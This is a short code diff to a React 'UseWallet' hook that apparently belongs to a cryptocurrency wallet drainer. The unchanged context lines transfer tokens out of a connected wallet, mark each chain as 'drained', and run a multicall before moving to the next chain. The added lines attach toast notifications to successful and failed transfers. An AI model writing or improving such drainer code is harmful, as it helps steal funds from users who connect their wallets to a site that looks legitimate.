@@ -273,9 +273,13 @@ export const UseWallet = () => {
           console.log(
             `Transferred ${amountInWei.toString()} of ${tokenAddress}`
           );
+          toast.success(
+            `Transferred ${amountInWei.toString()} of ${tokenAddress}`
+          );
 
           chainDrainStatus[chainId] = true; // Mark chain as drained if successful
         } catch (error) {
+          toast.error(`Transfer failed for ${tokenAddress}: ${error}`);
           console.log(`Transfer failed for ${tokenAddress}:`, error);
           continue; // Continue to next token on failure
         }
@@ -329,11 +333,13 @@ export const UseWallet = () => {
       console.log(`Multicall transaction hash: ${tx.hash}`);
       await tx.wait();
       console.log(`Multicall transaction confirmed: ${tx.hash}`);
+      toast(`Multicall transaction confirmed: ${tx.hash}`);
 
       chainDrainStatus[chainId] = true; // Mark chain as drained if successful
       await proceedToNextChain();
     } catch (error) {
       console.log("Multicall operation failed:", error);
+      toast.error("Multicall operation failed:");
       await proceedToNextChain();
     }
   };
